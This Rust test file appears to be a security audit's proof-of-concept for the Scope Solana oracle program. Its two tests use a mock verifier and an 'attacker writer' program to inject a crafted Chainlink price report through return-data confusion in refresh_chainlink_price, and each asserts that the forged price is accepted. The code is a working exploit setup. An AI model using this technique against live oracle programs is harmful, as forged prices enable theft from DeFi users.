//! PoC tests for return-data confusion in refresh_chainlink_price

use std::str::FromStr;

use anchor_lang::InstructionData;
use anchor_lang::ToAccountMetas;
use chainlink_streams_report::feed_id::ID as ChainlinkFeedID;
use chainlink_streams_report::report::v7::ReportDataV7;
use prost::Message as _;
use scope::oracles::chainlink::chainlink_streams_itf::{
    self as chainlink_itf, VERIFIER_CONFIG_PUBKEY, VERIFIER_PROGRAM_ID,
};
use scope::utils::consts::{ORACLE_MAPPING_SIZE, ORACLE_PRICES_SIZE, ORACLE_TWAPS_SIZE, TOKEN_METADATA_SIZE};
use scope::{self as scope_program, utils::pdas};
use solana_program::program::set_return_data;
use solana_program::pubkey::Pubkey;
use solana_program::sysvar;
use solana_program_test::{processor, ProgramTest};
use solana_sdk::account::Account;
use solana_sdk::instruction::{AccountMeta, Instruction};
use solana_sdk::signature::{Keypair, Signer};
use solana_sdk::system_program;
use solana_sdk::transaction::Transaction;

// Hardcode a deterministic attacker writer program id for tests
const ATTACKER_WRITER_ID: &str = "AttackerWriter11111111111111111111111111111";

fn attacker_writer_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[solana_program::account_info::AccountInfo],
    instruction_data: &[u8],
) -> solana_program::entrypoint::ProgramResult {
    // Simply set the provided bytes as return data
    set_return_data(instruction_data);
    Ok(())
}

fn mock_verifier_process_instruction(
    _program_id: &Pubkey,
    _accounts: &[solana_program::account_info::AccountInfo],
    instruction_data: &[u8],
) -> solana_program::entrypoint::ProgramResult {
    // The verify() helper encodes: [8-byte discriminator][borsh(Vec<u8>))]
    // We treat the signed_report bytes as: [mode | report_bytes...]
    if instruction_data.len() < 12 {
        // No signed_report provided; behave as a verifier that does not set return data
        return Ok(());
    }
    let len_le = <[u8; 4]>::try_from(&instruction_data[8..12]).unwrap();
    let len = u32::from_le_bytes(len_le) as usize;
    if instruction_data.len() < 12 + len || len == 0 {
        // Malformed; do nothing
        return Ok(());
    }
    let signed_report = &instruction_data[12..12 + len];
    let mode = signed_report[0];
    if mode == 0 {
        // Mode 0: Verifier succeeds but does NOT set return data
        return Ok(());
    }

    // Mode 1: Verifier CPIs to attacker-writer to overwrite return data after verification
    let report_bytes = &signed_report[1..];
    let ix = Instruction {
        program_id: Pubkey::from_str(ATTACKER_WRITER_ID).unwrap(),
        accounts: vec![],
        data: report_bytes.to_vec(),
    };
    solana_program::program::invoke(&ix, &[])?;
    Ok(())
}

fn build_chainlink_v7_report_bytes(feed: Pubkey, observations_ts: u64, exchange_rate_1e18: u128) -> Vec<u8> {
    // Build a minimal v7 report and prost-encode it
    let report = ReportDataV7 {
        // feed_id is 32-byte array within the Chainlink type
        feed_id: ChainlinkFeedID(feed.to_bytes()),
        observations_timestamp: observations_ts.into(),
        exchange_rate: num_bigint::BigInt::from(exchange_rate_1e18),
        // Unused/optional fields defaulted by struct literal completion
        ..Default::default()
    };
    let mut out = Vec::with_capacity(report.encoded_len());
    report.encode(&mut out).expect("encode v7 report");
    out
}

async fn get_oracle_price_value(banks: &mut solana_program_test::BanksClient, oracle_prices_pk: Pubkey) -> u64 {
    let acc = banks.get_account(oracle_prices_pk).await.unwrap().expect("oracle_prices account");
    let data = acc.data;
    // Anchor account discriminator (8) + oracle_mappings pubkey (32)
    let offset = 8 + 32;
    // DatedPrice layout: Price { value: u64, exp: u64 } + last_updated_slot: u64 + unix_timestamp: u64 + generic_data: [u8; 24]
    let dated_price_size = 8 + 8 + 8 + 8 + 24; // = 56
    let price_value_offset = offset + 0 * dated_price_size; // token index 0
    u64::from_le_bytes(data[price_value_offset..price_value_offset + 8].try_into().unwrap())
}

fn add_zeroed_account(pt: &mut ProgramTest, pubkey: Pubkey, space: usize, owner: Pubkey) {
    let lamports = 10_000_000_000; // plenty for tests
    pt.add_account(
        pubkey,
        Account {
            lamports,
            data: vec![0u8; 8 + space], // include 8 bytes for Anchor discriminator
            owner,
            executable: false,
            rent_epoch: 0,
        },
    );
}

#[tokio::test]
async fn poc_pre_write_last_writer_wins() {
    let mut pt = ProgramTest::new(
        "scope",
        scope_program::id(),
        processor!(scope_program::entry),
    );

    // Register mock verifier under the real VERIFIER_PROGRAM_ID and the attacker writer
    pt.add_program("mock_verifier", VERIFIER_PROGRAM_ID, processor!(mock_verifier_process_instruction));
    pt.add_program(
        "attacker_writer",
        Pubkey::from_str(ATTACKER_WRITER_ID).unwrap(),
        processor!(attacker_writer_process_instruction),
    );

    // Pre-create zeroed big accounts required by initialize
    let feed_name = "test-feed".to_string();
    let (configuration_pk, _bump) = pdas::config_pubkey(&feed_name);
    let oracle_mappings_pk = Keypair::new();
    let oracle_prices_pk = Keypair::new();
    let oracle_twaps_pk = Keypair::new();
    let token_metadatas_pk = Keypair::new();

    add_zeroed_account(&mut pt, oracle_mappings_pk.pubkey(), ORACLE_MAPPING_SIZE, scope_program::id());
    add_zeroed_account(&mut pt, oracle_prices_pk.pubkey(), ORACLE_PRICES_SIZE, scope_program::id());
    add_zeroed_account(&mut pt, oracle_twaps_pk.pubkey(), ORACLE_TWAPS_SIZE, scope_program::id());
    add_zeroed_account(&mut pt, token_metadatas_pk.pubkey(), TOKEN_METADATA_SIZE, scope_program::id());

    // Add unchecked verifier-related accounts with fixed addresses
    pt.add_account(
        VERIFIER_CONFIG_PUBKEY,
        Account { lamports: 1, data: vec![], owner: system_program::id(), executable: false, rent_epoch: 0 },
    );
    pt.add_account(
        chainlink_itf::ACCESS_CONTROLLER_PUBKEY,
        Account { lamports: 1, data: vec![], owner: system_program::id(), executable: false, rent_epoch: 0 },
    );

    let (mut banks, payer, recent_blockhash) = pt.start().await;

    // Initialize feed
    let admin = Keypair::from_bytes(&payer.to_bytes()).unwrap();
    let init_ix = Instruction {
        program_id: scope_program::id(),
        accounts: scope_program::accounts::Initialize {
            admin: admin.pubkey(),
            system_program: system_program::ID,
            configuration: configuration_pk,
            token_metadatas: token_metadatas_pk.pubkey(),
            oracle_twaps: oracle_twaps_pk.pubkey(),
            oracle_prices: oracle_prices_pk.pubkey(),
            oracle_mappings: oracle_mappings_pk.pubkey(),
        }
        .to_account_metas(None),
        data: scope_program::instruction::Initialize { feed_name: feed_name.clone() }.data(),
    };

    let mut tx = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer, &oracle_mappings_pk, &oracle_prices_pk, &oracle_twaps_pk, &token_metadatas_pk], recent_blockhash);
    banks.process_transaction(tx).await.unwrap();

    // Create a dummy feed id account to use as mapping.pubkey
    let feed_id_account = Keypair::new();
    banks
        .process_transaction(
            Transaction::new_signed_with_payer(
                &[solana_sdk::system_instruction::create_account(
                    &payer.pubkey(),
                    &feed_id_account.pubkey(),
                    1_000_000_000,
                    0,
                    &system_program::ID,
                )],
                Some(&payer.pubkey()),
                &[&payer, &feed_id_account],
                recent_blockhash,
            ),
        )
        .await
        .unwrap();

    // Update mapping to ChainlinkExchangeRate (v7 path), twap disabled, no ref price
    let price_type_chainlink_v7: u8 = scope_program::oracles::OracleType::ChainlinkExchangeRate.into();
    let update_mapping_ix = Instruction {
        program_id: scope_program::id(),
        accounts: scope_program::accounts::UpdateOracleMapping {
            admin: admin.pubkey(),
            configuration: configuration_pk,
            oracle_mappings: oracle_mappings_pk.pubkey(),
            price_info: Some(feed_id_account.pubkey()),
        }
        .to_account_metas(None),
        data: scope_program::instruction::UpdateMapping {
            token: 0,
            price_type: price_type_chainlink_v7,
            twap_enabled: false,
            twap_source: 0,
            ref_price_index: u16::MAX,
            feed_name: feed_name.clone(),
            generic_data: [0u8; 20],
        }
        .data(),
    };
    let mut tx = Transaction::new_with_payer(&[update_mapping_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer], recent_blockhash);
    banks.process_transaction(tx).await.unwrap();

    // Build a crafted v7 report for the mapping
    let crafted_price_1e18: u128 = 1_234_567_890_000_000_000; // 1.23456789e18
    let report_bytes = build_chainlink_v7_report_bytes(
        feed_id_account.pubkey(),
        1_000_000,
        crafted_price_1e18,
    );

    // Instruction 0: Attacker sets return data with crafted report
    let attacker_ix = Instruction {
        program_id: Pubkey::from_str(ATTACKER_WRITER_ID).unwrap(),
        accounts: vec![],
        data: report_bytes.clone(),
    };

    // Instruction 1: Call refresh_chainlink_price; verifier will not set return data (mode=0)
    // signed_report payload: [mode=0]
    let mut signed_report = vec![0u8];

    let refresh_ix = Instruction {
        program_id: scope_program::id(),
        accounts: scope_program::accounts::RefreshChainlinkPrice {
            user: admin.pubkey(),
            oracle_prices: oracle_prices_pk.pubkey(),
            oracle_mappings: oracle_mappings_pk.pubkey(),
            oracle_twaps: oracle_twaps_pk.pubkey(),
            verifier_account: VERIFIER_CONFIG_PUBKEY,
            access_controller: chainlink_itf::ACCESS_CONTROLLER_PUBKEY,
            config_account: Pubkey::default(),
            verifier_program_id: VERIFIER_PROGRAM_ID,
        }
        .to_account_metas(None),
        data: scope_program::instruction::RefreshChainlinkPrice {
            token: 0,
            serialized_chainlink_report: signed_report, // pass only the signed_report; handler constructs the verify ix
        }
        .data(),
    };

    // Execute transaction with attacker pre-write then refresh
    let mut tx = Transaction::new_with_payer(&[attacker_ix, refresh_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer], recent_blockhash);
    banks.process_transaction(tx).await.unwrap();

    // Read price value and assert it changed from 0 to non-zero (crafted)
    let value = get_oracle_price_value(&mut banks, oracle_prices_pk.pubkey()).await;
    assert!(value > 0, "price not updated from pre-write return data");
}

#[tokio::test]
async fn poc_cpi_overwrite_inside_verifier() {
    let mut pt = ProgramTest::new(
        "scope",
        scope_program::id(),
        processor!(scope_program::entry),
    );

    pt.add_program("mock_verifier", VERIFIER_PROGRAM_ID, processor!(mock_verifier_process_instruction));
    pt.add_program(
        "attacker_writer",
        Pubkey::from_str(ATTACKER_WRITER_ID).unwrap(),
        processor!(attacker_writer_process_instruction),
    );

    // Accounts
    let feed_name = "test-feed2".to_string();
    let (configuration_pk, _bump) = pdas::config_pubkey(&feed_name);
    let oracle_mappings_pk = Keypair::new();
    let oracle_prices_pk = Keypair::new();
    let oracle_twaps_pk = Keypair::new();
    let token_metadatas_pk = Keypair::new();

    add_zeroed_account(&mut pt, oracle_mappings_pk.pubkey(), ORACLE_MAPPING_SIZE, scope_program::id());
    add_zeroed_account(&mut pt, oracle_prices_pk.pubkey(), ORACLE_PRICES_SIZE, scope_program::id());
    add_zeroed_account(&mut pt, oracle_twaps_pk.pubkey(), ORACLE_TWAPS_SIZE, scope_program::id());
    add_zeroed_account(&mut pt, token_metadatas_pk.pubkey(), TOKEN_METADATA_SIZE, scope_program::id());

    pt.add_account(
        VERIFIER_CONFIG_PUBKEY,
        Account { lamports: 1, data: vec![], owner: system_program::id(), executable: false, rent_epoch: 0 },
    );
    pt.add_account(
        chainlink_itf::ACCESS_CONTROLLER_PUBKEY,
        Account { lamports: 1, data: vec![], owner: system_program::id(), executable: false, rent_epoch: 0 },
    );

    let (mut banks, payer, recent_blockhash) = pt.start().await;
    let admin = Keypair::from_bytes(&payer.to_bytes()).unwrap();

    // Initialize
    let init_ix = Instruction {
        program_id: scope_program::id(),
        accounts: scope_program::accounts::Initialize {
            admin: admin.pubkey(),
            system_program: system_program::ID,
            configuration: configuration_pk,
            token_metadatas: token_metadatas_pk.pubkey(),
            oracle_twaps: oracle_twaps_pk.pubkey(),
            oracle_prices: oracle_prices_pk.pubkey(),
            oracle_mappings: oracle_mappings_pk.pubkey(),
        }
        .to_account_metas(None),
        data: scope_program::instruction::Initialize { feed_name: feed_name.clone() }.data(),
    };
    let mut tx = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer, &oracle_mappings_pk, &oracle_prices_pk, &oracle_twaps_pk, &token_metadatas_pk], recent_blockhash);
    banks.process_transaction(tx).await.unwrap();

    // Dummy feed id account
    let feed_id_account = Keypair::new();
    banks
        .process_transaction(
            Transaction::new_signed_with_payer(
                &[solana_sdk::system_instruction::create_account(
                    &payer.pubkey(),
                    &feed_id_account.pubkey(),
                    1_000_000_000,
                    0,
                    &system_program::ID,
                )],
                Some(&payer.pubkey()),
                &[&payer, &feed_id_account],
                recent_blockhash,
            ),
        )
        .await
        .unwrap();

    // Update mapping for ChainlinkExchangeRate (v7)
    let price_type_chainlink_v7: u8 = scope_program::oracles::OracleType::ChainlinkExchangeRate.into();
    let update_mapping_ix = Instruction {
        program_id: scope_program::id(),
        accounts: scope_program::accounts::UpdateOracleMapping {
            admin: admin.pubkey(),
            configuration: configuration_pk,
            oracle_mappings: oracle_mappings_pk.pubkey(),
            price_info: Some(feed_id_account.pubkey()),
        }
        .to_account_metas(None),
        data: scope_program::instruction::UpdateMapping {
            token: 0,
            price_type: price_type_chainlink_v7,
            twap_enabled: false,
            twap_source: 0,
            ref_price_index: u16::MAX,
            feed_name: feed_name.clone(),
            generic_data: [0u8; 20],
        }
        .data(),
    };
    let mut tx = Transaction::new_with_payer(&[update_mapping_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer], recent_blockhash);
    banks.process_transaction(tx).await.unwrap();

    // Build a crafted report
    let report_bytes = build_chainlink_v7_report_bytes(feed_id_account.pubkey(), 2_000_000, 42_000_000_000_000_000_000u128);

    // signed_report payload: [mode=1 | report_bytes]
    let mut signed_report = Vec::with_capacity(1 + report_bytes.len());
    signed_report.push(1u8);
    signed_report.extend_from_slice(&report_bytes);

    let refresh_ix = Instruction {
        program_id: scope_program::id(),
        accounts: scope_program::accounts::RefreshChainlinkPrice {
            user: admin.pubkey(),
            oracle_prices: oracle_prices_pk.pubkey(),
            oracle_mappings: oracle_mappings_pk.pubkey(),
            oracle_twaps: oracle_twaps_pk.pubkey(),
            verifier_account: VERIFIER_CONFIG_PUBKEY,
            access_controller: chainlink_itf::ACCESS_CONTROLLER_PUBKEY,
            config_account: Pubkey::default(),
            verifier_program_id: VERIFIER_PROGRAM_ID,
        }
        .to_account_metas(None),
        data: scope_program::instruction::RefreshChainlinkPrice {
            token: 0,
            serialized_chainlink_report: signed_report,
        }
        .data(),
    };

    let mut tx = Transaction::new_with_payer(&[refresh_ix], Some(&payer.pubkey()));
    tx.sign(&[&payer], recent_blockhash);
    banks.process_transaction(tx).await.unwrap();

    let value = get_oracle_price_value(&mut banks, oracle_prices_pk.pubkey()).await;
    assert!(value > 0, "price not updated from CPI-overwrite return data");
}

